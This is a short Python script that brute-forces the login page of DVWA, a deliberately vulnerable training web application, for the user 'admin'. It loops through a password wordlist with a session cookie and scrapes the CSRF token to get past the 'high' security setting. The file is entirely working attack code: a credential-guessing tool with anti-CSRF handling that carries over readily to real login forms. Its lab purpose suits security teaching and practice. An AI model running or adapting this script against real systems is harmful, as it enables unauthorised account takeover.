#!/usr/bin/env python3
#Script to tackle the "brute force" challenge in DVWA
#Only can be used on the low, medium or high security setting.
#Be sure to update security, PHPSessionID, password_file and url to match your env.

import requests
from bs4 import BeautifulSoup as bs

security = "low"
password_file = "/tmp/fasttrack.txt"
url="http://192.168.1.163:8082/vulnerabilities/brute/"

with open(password_file, 'r') as f:
    passwords=f.readlines()

cookies={
        'security' : security,
        'PHPSESSID' : 'a0bnlpoocngmkkbcls16s0hnj0'
        }

#Creates a payload for each password in the list
def payload(passwords=passwords):
  payload = []

  for password in passwords:
      payload.append({
                      'username': 'admin',
                      'password': password.strip(), 
                      'Login':'Login', 
                      })

  return payload

#Get the user_token from html.
def grabCRSFToken(r):
    soup = bs(r.content,'html.parser')
    return soup.findAll(attrs={"name" : "user_token"})[0].get('value')

#Test the payloads and return Succesful if it works. 
def testPassword():
    params = payload()

    for param in params:
      r = createSession(param)
      print(r.url)
      
      if "Welcome" in r.text:
         print("Success: ", r.url)
         quit()

#Create and return requests session object. 
def createSession(param, url=url,cookies=cookies,security=security):
    s = requests.Session()
    if security == 'high':
      r = s.get(url, cookies=cookies)
      user_token = grabCRSFToken(r)
      param['user_token'] = user_token
      r = s.get(url, cookies=cookies,params=param)
    else:
      r = s.get(url, cookies=cookies, params=param)
    return r

def main():
  testPassword()

main()
